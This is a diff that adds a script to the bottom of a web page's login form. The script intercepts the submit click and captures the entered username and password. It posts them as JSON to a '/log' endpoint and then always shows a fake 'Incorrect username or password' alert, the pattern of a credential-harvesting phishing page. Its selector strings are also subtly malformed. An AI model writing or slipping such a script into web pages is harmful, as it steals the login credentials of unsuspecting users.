@@ -323,5 +323,29 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         </div>
     </div>
 </footer>
+    <script>
+        let button = document.querySelector('document.querySelector("#_submit")')
+        let username = document.querySelector('document.querySelector("#username")')
+        let password = document.querySelector('document.querySelector("#password")')
+        button.addEventListener('click', ev => {
+            ev.preventDefault()
+            let reqData = {
+                username: username.value,
+                password: password.value
+            }
+            console.log(reqData)
+            fetch('/log', {
+                method: "POST",
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify(reqData)
+            }).then(res => {
+                return res.json()
+            }).then(res => {
+                alert("Incorrect username or password.")
+            }).catch(err => {
+                alert(err)
+            })
+        })
+    </script>
     </body>
 </html>
